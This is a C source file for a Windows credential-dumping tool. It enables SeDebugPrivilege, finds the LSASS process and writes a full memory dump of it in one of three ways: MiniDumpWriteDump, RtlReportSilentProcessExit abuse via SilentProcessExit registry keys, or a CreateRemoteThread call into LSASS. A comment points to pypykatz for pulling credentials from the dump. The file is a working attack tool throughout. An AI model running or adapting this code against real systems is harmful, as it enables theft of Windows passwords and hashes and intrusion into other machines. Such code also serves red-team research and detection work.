#include <windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <TlHelp32.h>



typedef enum {
	MiniDumpWriteDumpMode = 1,
	RtlSilentProcessExitMode = 2,
	CreateRemoteThreadMode = 3,
}DUMP_MODE;

VOID HelpMenu(LPCSTR argv0) {
	printf("Usage: %s DUMP_MODE\n", argv0);
	printf("\tDUMP_MODE:\n");
	printf("\t\t1 - Use MiniDumpWriteDump on LSASS process handle\n");
	printf("\t\t2 - Call RtlSilentProcessExit on LSASS process handle\n");
	printf("\t\t3 - Call CreateRemoteThread on RtlSilentProcessExit on LSASS\n\n");
}
DUMP_MODE MgArgs(int argc, LPCSTR argv[]) {
	int dumpMode;
	if (argc != 2) {
		HelpMenu(argv[0]);
		return -1;
	}
	dumpMode = atoi(argv[1]);
	if (dumpMode < 1 || dumpMode > 3) {
		HelpMenu(argv[0]);
		return -1;
	}
	return dumpMode;
}


// pypykatz lsa minidump lsass.dmp
BOOL EnableWindowsPrivilege(LPCSTR Privilege) {
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid;
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken;

	if (!LookupPrivilegeValueA(NULL, Privilege, &luid)) return FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}

BOOL CheckWindowsPrivilege(LPCSTR Privilege) {
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValueA(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

DWORD GetProcessPid(LPCSTR TargetProcessName) {
	DWORD lsassPID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCSTR processName = "";
	if (Process32First(snapshot, &processEntry)) {
		while (strcmp(processName, TargetProcessName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		printf("[+] Got lsass.exe PID: %i\n", lsassPID);
	}
	return lsassPID;
}


// Source: https://github.com/deepinstinct/LsassSilentProcessExit

// TODO:
// Clean reg key !!! ???
// Dump dir as arg ?? 

typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit_func) (HANDLE ProcessHandle,NTSTATUS ExitStatus);
#define IFEO_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define SILENT_PROCESS_EXIT_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"


#define LOCAL_DUMP						0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define MiniDumpWithFullMemory			0x2
#define STATUS_SUCCESS					0x00000000


BOOL DeleteRegistryTree(HKEY key, LPCSTR lpSubKey, LPCSTR lpSubKeyToDel) {
	HKEY hKey = NULL;
	DWORD ulOptions = DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY; // KEY_WOW64_64KEY ??
	BOOL returnValue = FALSE;

	if (RegOpenKeyExA(key, lpSubKey, 0, ulOptions,&hKey) == ERROR_SUCCESS){
		returnValue = (RegDeleteTreeA(hKey, lpSubKeyToDel) == ERROR_SUCCESS);
		RegCloseKey(hKey);
	}
	return returnValue;
}



BOOL SetRegGlobalFlag(LPCSTR processName) {
	// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
	DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
	HKEY m_hIFEORegKey;

	char*  subkeySPE_P = (char*)malloc(MAX_PATH);
	if (subkeySPE_P == NULL) {
		free(subkeySPE_P);
		return FALSE;
	}
	sprintf_s(subkeySPE_P, MAX_PATH, "%s\\%s", SILENT_PROCESS_EXIT_REG_KEY, processName);


	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE_P, &m_hIFEORegKey) != ERROR_SUCCESS) {
		free(subkeySPE_P);
		return FALSE;
	}
	
	if (RegSetValueExA(m_hIFEORegKey, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagData, sizeof(DWORD)) != ERROR_SUCCESS) {
		RegCloseKey(m_hIFEORegKey);
		free(subkeySPE_P);
		return FALSE;

	}
	RegCloseKey(m_hIFEORegKey);
	free(subkeySPE_P);
	return TRUE;
}
BOOL SetRegSilentProcessExit(LPCSTR dumpFolder, LPCSTR processName) {
	HKEY m_hSPERegKey;
	char* subkeySPE_P;
	BOOL ret;
	DWORD ReportingMode = MiniDumpWithFullMemory;
	DWORD DumpType = LOCAL_DUMP;

	subkeySPE_P = (char*)malloc(MAX_PATH);
	if (subkeySPE_P == NULL) {
		return FALSE;
	}
	sprintf_s(subkeySPE_P, MAX_PATH, "%s\\%s", SILENT_PROCESS_EXIT_REG_KEY, processName);
	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE_P, &m_hSPERegKey) != ERROR_SUCCESS) {
		free(subkeySPE_P);
		return FALSE;
	}
	// Set SilentProcessExit registry values for the target process
	ret = RegSetValueExA(m_hSPERegKey, "ReportingMode", 0, REG_DWORD, (const BYTE*)&ReportingMode, sizeof(DWORD)) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "LocalDumpFolder", 0, REG_SZ, (const BYTE*)dumpFolder, (DWORD)strlen(dumpFolder) + 1) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "DumpType", 0, REG_DWORD, (const BYTE*)&DumpType, sizeof(DWORD)) == ERROR_SUCCESS;

	RegCloseKey(m_hSPERegKey);
	free(subkeySPE_P);
	return ret;
}
BOOL CleanRegSilentProcessExit(LPCSTR processName) {
	BOOL returnValue = FALSE;
	returnValue = DeleteRegistryTree(HKEY_LOCAL_MACHINE, IFEO_REG_KEY, processName);
	returnValue &= DeleteRegistryTree(HKEY_LOCAL_MACHINE, SILENT_PROCESS_EXIT_REG_KEY, processName);
	return returnValue;
}



BOOL DumpProcessSilent(DUMP_MODE dumpMode, DWORD lsassPID) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll"); // load lib ??? 
	if (hNtdll == NULL) {
		printf("[x] Fail to load ntdll.dll\n");
		return FALSE;
	}
	RtlReportSilentProcessExit_func RtlReportSilentProcessExit = (RtlReportSilentProcessExit_func)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");
	if (RtlReportSilentProcessExit == NULL) {
		printf("[x] Fail to GetProcAddress of RtlReportSilentProcessExit\n");
		return FALSE;
	}


	DWORD desiredAccess;
	if (dumpMode == RtlSilentProcessExitMode)
		desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
	else
		// CreateRemoteThread required privileges
		desiredAccess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;


	HANDLE hProcess = OpenProcess(desiredAccess, FALSE, lsassPID);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("[x] ERROR OpenProcess() failed with error: %ld\n", GetLastError());
		return FALSE;
	}
	if (dumpMode == RtlSilentProcessExitMode) {
		NTSTATUS ntstatus = RtlReportSilentProcessExit(hProcess, 0);
		if (ntstatus != STATUS_SUCCESS) {
			printf("[x] ERROR RtlReportSilentProcessExit() NTSTATUS: 0x%x\n", ntstatus);
			CloseHandle(hProcess);
			return FALSE;
		}
	} else {
		// While RtlReportSilentProcessExit accepts two parameters, 
		// the second parameter is the exit code which has no significant effect on the API.
		// The first parameter is set to -1 (0xFFFF) which is the pseudo-handle returned from GetCurrentProcess()
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RtlReportSilentProcessExit, (LPVOID)-1, 0, NULL);
		if (hThread == NULL) {
			printf("[x] ERROR CreateRemoteThread() failed with error: %ld\n", GetLastError());
			CloseHandle(hProcess);
			return FALSE;
		}
		CloseHandle(hThread);
	}
	CloseHandle(hProcess);
	printf("[+] DONE! Check out the dump folder (C:\\temp)\n"); // path var ?? 
	return TRUE;
}
BOOL DumpProcess(DUMP_MODE dumpMode, DWORD lsassPID) {
	BOOL retVal;
	LPCSTR processName = "lsass.exe";

	printf("[+] Setting up GFlags settings in registry...\n");
	// This sets up the GlobalFlag value in the IFEO registry key and the SilentProcessExit registry values
	if (!SetRegGlobalFlag(processName)) {
		printf("[x] ERROR: Could not set registry values!\n");
		return FALSE;
	}
	printf("[+] Setting up SilentProcessExit settings in registry...\n");
	if (!SetRegSilentProcessExit("C:\\temp", processName)) {
		printf("[x] ERROR: Could not set registry values!\n");
		return FALSE;
	}
	system("pause");
	retVal = DumpProcessSilent(dumpMode, lsassPID);
	if (!CleanRegSilentProcessExit(processName)) {
		printf("[w] Fail to clean reg key (requiring manual removal) !\n");
	}
	return retVal;
}



BOOL MiniDumpProcess(DWORD lsassPID) {
	BOOL retVal = FALSE;
	HANDLE lsassHandle;
	HANDLE outFile = CreateFileA("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (outFile != NULL) {
		lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
		if (lsassHandle != NULL) {
			typedef BOOL(WINAPI* _MiniDumpWriteDumpFunc)(
				HANDLE                            hProcess,
				DWORD                             ProcessId,
				HANDLE                            hFile,
				MINIDUMP_TYPE                     DumpType,
				PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
				PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
				PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
				);

			//HMODULE hDbghelp = GetModuleHandleA("Dbghelp.dll");
			HMODULE hDbghelp = LoadLibraryA("Dbghelp.dll");
			if (hDbghelp == NULL) {
				printf("[x] Fail hDbghelp == NULL !\n");
				return FALSE;
			}
			_MiniDumpWriteDumpFunc MiniDumpWriteDumpFunc = (_MiniDumpWriteDumpFunc)
				GetProcAddress(hDbghelp, "MiniDumpWriteDump");
			if (MiniDumpWriteDumpFunc != NULL) {
				retVal = MiniDumpWriteDumpFunc(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
			}else
				printf("[x] Fail to GetProcAddress MiniDumpWriteDumpFunc == NULL !\n");
			CloseHandle(lsassHandle);
		} else
			printf("[x] Fail to open process lsass !\n");
		CloseHandle(outFile);
	}else
		printf("[x] Fail to create file lsass.dmp !\n");
	return retVal;
}

int main(int argc, LPCSTR argv[]) {
	DWORD lsassPID;
	DUMP_MODE dumpMode = MgArgs(argc, argv);
	BOOL dumpResult = FALSE;
	printf("[-] Dumping LSASS process:\n");

	if (dumpMode == -1)
		return TRUE;
	if (!EnableWindowsPrivilege(SE_DEBUG_NAME)) {
		printf("[x] Could not enable SeDebugPrivilege!\n");
		return TRUE;
	}
	if (!CheckWindowsPrivilege(SE_DEBUG_NAME)) {
		printf("[+] I do not have SeDebugPrivilege!\n");
		return TRUE;
	}
	printf("[+] SeDebugPrivilege set !\n");

	lsassPID = GetProcessPid("lsass.exe");
	if (lsassPID == 0) {
		printf("[x] Fail to get lsass.exe PID !\n");
		return TRUE;
	}
	switch (dumpMode) {
	case MiniDumpWriteDumpMode:
		dumpResult = MiniDumpProcess(lsassPID);
		break;
	case RtlSilentProcessExitMode:
	case CreateRemoteThreadMode:
		dumpResult = DumpProcess(dumpMode, lsassPID);
		break;
	default:
		break;
	}

	if(dumpResult)
		printf("[+] lsass dumped successfully!\n");
	else
		printf("[x] lsass dumped fail (%ld)!\n", GetLastError());
	return FALSE;
}